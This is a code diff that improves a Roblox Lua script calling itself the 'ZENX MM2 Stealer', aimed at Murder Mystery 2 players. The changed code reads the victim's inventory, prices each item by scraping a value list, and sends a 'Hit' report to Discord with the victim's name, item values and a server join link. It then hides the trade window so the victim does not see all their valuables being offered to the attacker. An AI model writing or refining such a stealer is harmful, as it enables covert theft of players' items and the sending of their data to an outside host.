@@ -18,63 +18,38 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Biscuit-Style Value Scraper
+-- Biscuit-Style Value Scraper + Rarity Categories
 local valuePages = {
     godly = "https://supremevaluelist.com/mm2/godlies.html",
     ancient = "https://supremevaluelist.com/mm2/ancients.html",
     unique = "https://supremevaluelist.com/mm2/uniques.html",
     vintage = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
 }
 
-local function cleanString(str)
-    return str:match("^%s*(.-)%s*$")
-end
-
-local function getItemValue(htmlBlock)
-    local valText = htmlBlock:match("([%d,]+)")
-    if valText then return tonumber(valText:gsub(",", "")) end
-    return nil
-end
-
-local function parsePage(pageHtml)
-    local values = {}
-    for block in pageHtml:gmatch("(<h.-</div>)") do  -- Better block matching
-        local title = block:match(">([^<]+)<")
-        local val = getItemValue(block)
-        if title and val then
-            local cleanTitle = cleanString(title:gsub("%s+", " "))
-            cleanTitle = cleanString((cleanTitle:split(" Click "))[1])
-            values[cleanTitle:lower()] = val
-        end
-    end
-    return values
-end
-
+local itemValues = {}
 local function loadValues()
-    local normalValues = {}
     for _, link in pairs(valuePages) do
         pcall(function()
             local resp = request({Url = link, Method = "GET"})
             if resp and resp.Body then
-                local parsed = parsePage(resp.Body)
-                for n, v in pairs(parsed) do
-                    normalValues[n] = v
+                for name, valStr in resp.Body:gmatch(">([%w%s'%-]+)</[^>]+>%s*Value%s*%-%s*%*?([%d,]+)%*?") do
+                    local clean = name:match("^%s*(.-)%s*$"):lower()
+                    local val = tonumber(valStr:gsub(",", ""))
+                    if clean and val then itemValues[clean] = val end
                 end
             end
         end)
         task.wait(0.5)
     end
-    return normalValues
 end
+loadValues()
 
-local itemValues = loadValues()
-
--- In-Game Inventory
+-- Inventory with Rarity Groups (like the script you sent)
 local itemsToTrade = {}
 local overallValue = 0
-local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local rarityCounts = {Unique=0, Ancient=0, Godly=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
 
+local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
 local success, inventoryData = pcall(function()
     return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 end)
@@ -84,16 +59,21 @@ if success and inventoryData and inventoryData.Weapons then
         local info = itemDatabase[itemId]
         if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
             local name = tostring(info.ItemName)
-            local val = itemValues[name:lower()] or 150
+            local lowerName = name:lower()
+            local val = itemValues[lowerName] or 150
             overallValue += val * count
-            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
+            
+            local rarity = info.Rarity or "Common"
+            if rarityCounts[rarity] then rarityCounts[rarity] += count end
+            
+            table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val, rarity = rarity})
         end
     end
 end
 
 table.sort(itemsToTrade, function(a, b) return (a.val * a.qty) > (b.val * b.qty) end)
 
--- Discord with your joiner
+-- Discord
 local function postToDiscord()
     local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. game.JobId
     local displayLines = {}
@@ -112,8 +92,9 @@ local function postToDiscord()
             title = "🍪 ZENX | Murder Mystery 2 Hit",
             color = 0xFF00FF,
             fields = {
-                {name = "Victim", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true},
+                {name = "Victim", value = LocalPlayer.Name, inline = true},
                 {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
+                {name = "Rarity Breakdown", value = string.format("Godly: %d | Ancient: %d | Unique: %d | Vintage: %d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
                 {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                 {name = "Custom Joiner", value = joinLink, inline = false},
             },
@@ -132,7 +113,7 @@ local function postToDiscord()
     end)
 end
 
--- Trade Engine
+-- Trade Engine (improved)
 local function checkTradeState()
     return ReplicatedStorage:WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
 end
@@ -140,7 +121,7 @@ end
 local function doTrade(target)
     task.spawn(function()
         postToDiscord()
-        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI")
+        local tradeGui = LocalPlayer.PlayerGui:FindFirstChild("TradeGUI") or LocalPlayer.PlayerGui:FindFirstChild("TradeGUI_Phone")
         if tradeGui then
             tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() tradeGui.Enabled = false end)
         end
@@ -154,7 +135,7 @@ local function doTrade(target)
                     local item = table.remove(itemsToTrade, 1)
                     for _ = 1, item.qty do
                         ReplicatedStorage.Trade.OfferItem:FireServer(item.id, "Weapons")
-                        task.wait(0.32)
+                        task.wait(0.3)
                     end
                 end
                 task.wait(4)
@@ -181,4 +162,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer - Biscuit Value Scraper Loaded")
+print("✅ ZENX MM2 Stealer Loaded (Biscuit Scraper + Rarity Groups)")
